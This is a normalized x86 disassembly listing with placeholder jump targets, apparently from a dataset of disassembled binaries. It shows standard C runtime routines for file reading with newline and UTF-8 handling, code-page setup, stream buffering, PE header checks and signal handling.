mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0x10 ] 0x2
mov [ esi + ecx + 0x25 ] 0xa
jne r-xdata
and [ eax ] 0xfb
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0xa
jne r-xdata
and [ eax ] 0xfb
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0xa
jne r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x26 ]
cmp cl 0xa
je r-xdata
sub ebx [ ebp - 0xc ]
mov [ ebp - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x10 ]
movzx ecx [ eax ]
cmp cx 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
mov eax ebx
sub eax [ ebp - 0xc ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0x10 ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ecx ]
cmp al 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov ecx [ edi ]
lea esi [ esi + ecx + 0x4 ]
test [ esi ] 0x40
jne r-xdata
cmp cx 0xd
je r-xdata
mov ebx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0x10 ] eax
cmp ebx eax
jae r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov ebx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0x10 ] eax
cmp ebx eax
jae r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x3
mov [ esi + ecx + 0x26 ] 0xa
mov ax [ eax ]
mov [ ebx ] ax
inc ebx
inc ebx
or [ esi ] 0x2
jmp r-xdata
mov ecx [ ebp - 0x10 ]
add ecx 0xfffffffe
cmp eax ecx
jae r-xdata
mov [ ebx ] cx
inc ebx
inc ebx
inc eax
inc eax
mov [ ebp + 0x10 ] eax
jmp r-xdata
dec ebx
mov cl [ ebx ]
test cl cl
js r-xdata
mov al [ ecx ]
mov [ ebx ] al
inc ebx
or [ eax ] 0x2
jmp r-xdata
mov eax [ ebp - 0x10 ]
dec eax
cmp ecx eax
jae r-xdata
mov [ ebx ] al
inc ebx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add [ ebp + 0x10 ] 0x2
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x2
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea ecx [ eax + 0x2 ]
cmp [ ecx ] 0xa
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
xor eax eax
inc eax
movzx ecx cl
jmp r-xdata
inc ebx
jmp r-xdata
inc [ ebp + 0x10 ]
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add eax 0x4
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ecx + rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
sub ebx [ ebp - 0xc ]
shr eax 0x1
push eax
push [ ebp + 0xc ]
push ebx
push [ ebp - 0xc ]
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x10 ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
inc ecx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
push 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
pop eax
mov [ ebx ] ax
cmp eax 0x4
jg r-xdata
mov dl [ ebx ]
movzx ecx dl
movsx ecx [ ecx + rw-data ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ edi ]
xor ecx ecx
cmp eax ebx
setne cl
add eax eax
mov [ ebp - 0x10 ] eax
mov [ esi + edx + 0x30 ] ecx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebx ] 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
inc ebx
cmp ebx [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp ebx [ ebp - 0xc ]
jb r-xdata
inc ecx
cmp ecx eax
jne r-xdata
call sub_10026065
mov [ eax ] 0x2a
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_10031912
add esp 0x10
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
push 0xa
jmp r-xdata
push 0xd
pop eax
mov [ ebx ] ax
mov eax [ edi ]
mov cl [ ebp - 0x8 ]
mov [ esi + eax + 0x5 ] cl
mov eax [ edi ]
mov cl [ ebp - 0x7 ]
mov [ esi + eax + 0x25 ] cl
mov eax [ edi ]
mov [ esi + eax + 0x26 ] 0xa
jmp r-xdata
dec ebx
movzx ecx [ ebx ]
inc eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
je r-xdata
add ebx eax
jmp r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_10031912
add esp 0x10
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
mov [ ebx ] 0xa
jmp r-xdata
mov [ ebx ] 0xd
mov eax [ edi ]
mov cl [ ebp - 0x1 ]
mov [ esi + eax + 0x5 ] cl
jmp r-xdata
inc ebx
inc ebx
neg eax
cdq
push 0x1
push edx
push eax
push [ ebp + 0x8 ]
call sub_10031912
add esp 0x10
inc ebx
cmp eax 0x2
mov [ ecx + 0x5 ] dl
jl r-xdata
cmp eax 0x3
jne r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x25 ] dl
inc ebx
sub ebx eax
jmp r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x26 ] dl
inc ebx
sub_1002cb15
push 0x10
push r--data
call sub_10028b48
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor esi esi
cmp eax esi
jl r-xdata
call sub_10026078
and [ eax ] 0x0
call sub_10026065
mov [ eax ] 0x9
call sub_10026078
mov [ eax ] esi
call sub_10026065
mov [ eax ] 0x9
cmp eax [ rw-data ]
jb r-xdata
call sub_10028b8d
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov edi eax
and edi 0x1f
shl edi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + edi + 0x4 ]
and ecx 0x1
je r-xdata
mov ecx 0x7fffffff
cmp ecx [ ebp + 0x10 ]
sbb ecx ecx
inc ecx
jne r-xdata
push eax
call sub_10032f5b
pop ecx
mov [ ebp - 0x4 ] esi
mov eax [ ebx ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_10026078
mov [ eax ] esi
call sub_10026065
mov [ eax ] 0x16
jmp r-xdata
call sub_10026065
mov [ eax ] 0x9
call sub_10026078
mov [ eax ] esi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1002c553
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_10020579
add esp 0x14
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002cc08
mov eax [ ebp - 0x1c ]
sub_1002cc12
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_1002ae89
push eax
call sub_10031ab0
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
call sub_10022fff
add eax 0x20
cmp esi eax
jne r-xdata
call sub_10022fff
add eax 0x40
cmp esi eax
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
inc [ rw-data ]
test [ esi + 0xc ] 0x10c
jne r-xdata
push ebx
push edi
lea edi [ eax * 4 + rw-data ]
cmp [ edi ] 0x0
mov ebx 0x1000
jne r-xdata
mov edi [ edi ]
mov [ esi + 0x8 ] edi
mov [ esi ] edi
mov [ esi + 0x18 ] ebx
mov [ esi + 0x4 ] ebx
push ebx
call sub_10026ca5
pop ecx
mov [ edi ] eax
test eax eax
jne r-xdata
pop esi
pop ebp
retn
lea eax [ esi + 0x14 ]
push 0x2
mov [ esi + 0x8 ] eax
mov [ esi ] eax
pop eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x4 ] eax
jmp r-xdata
or [ esi + 0xc ] 0x1102
xor eax eax
pop edi
inc eax
pop ebx
jmp r-xdata
sub_1002ccae
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x1000
je r-xdata
pop esi
push esi
call sub_10022bd6
and [ esi + 0xc ] 0xffffeeff
and [ esi + 0x18 ] 0x0
and [ esi ] 0x0
and [ esi + 0x8 ] 0x0
pop ecx
sub_1002cce2
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_1002cd11
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_100209e0
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_1002cd75
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
mov dl cl
add dl 0x20
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
mov dl cl
sub dl 0x20
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_10030056
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_100268cc
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_100268cc
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10020040
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
inc ebx
mov al [ ebx ]
inc ebx
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_100209e0
add esp 0xc
mov [ esi + eax + 0x11d ] 0x0
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_1002cf08
push 0xc
push r--data
call sub_10028b48
call sub_10027e84
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_10028f4e
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002cfa3
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_10028b8d
retn
push 0x20
call sub_10023708
pop ecx
cmp esi rw-data
je r-xdata
push esi
call sub_100207fd
pop ecx
sub_1002cfac
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_10023358
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_1002d028
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_1002cfac
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_1002cd11
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_100209e0
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10020040
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_1002cce2
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
inc ecx
mov [ eax ] si
inc ecx
inc eax
inc eax
dec edx
jne r-xdata
mov esi ebx
call sub_1002cd75
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
inc esi
inc esi
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_100209e0
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_1002cce2
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
inc esi
inc esi
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_1002d20d
push 0x14
push r--data
call sub_10028b48
or [ ebp - 0x20 ] 0xffffffff
call sub_10027e84
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_1002cf08
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_1002cfac
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_10026ca5
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_10028b8d
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_1002d028
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_10026065
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_100207fd
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_100207fd
pop ecx
push 0xd
call sub_10028f4e
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002d36e
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_100207fd
pop ecx
sub_1002d3c5
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_10023358
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_10030985
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_10030056
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_1002d47d
mov edi edi
push esi
push edi
xor edi edi
lea esi [ edi + rw-data ]
push [ esi ]
call sub_10027bbd
add edi 0x4
pop ecx
mov [ esi ] eax
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_1002d4a0
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_1002d4e0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
jbe r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1002d530
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_10028bb0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_1002d4a0
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_1002d4e0
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1002d639
push 0x8
push r--data
call sub_10028b48
push [ rw-data ]
call sub_10027c38
pop ecx
test eax eax
je r-xdata
call sub_1002d5ed
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_1002d6a0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_1002d6e4
push 0x20
push r--data
call sub_10028b48
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_10027e0b
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_10028b8d
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_1002d6a0
mov esi eax
add esi 0x8
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_1002398e
mov [ ebp - 0x1c ] 0x1
push eax
call sub_10027c38
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_10026065
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10020579
add esp 0x14
jmp r-xdata
mov [ ebp - 0x20 ] eax
pop ecx
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_10028f4e
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_10027c2f
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002d858
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
add ecx edx
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_1002d8b2
push 0x10
push r--data
call sub_10028b48
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ InitializeCriticalSectionAndSpinCount@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
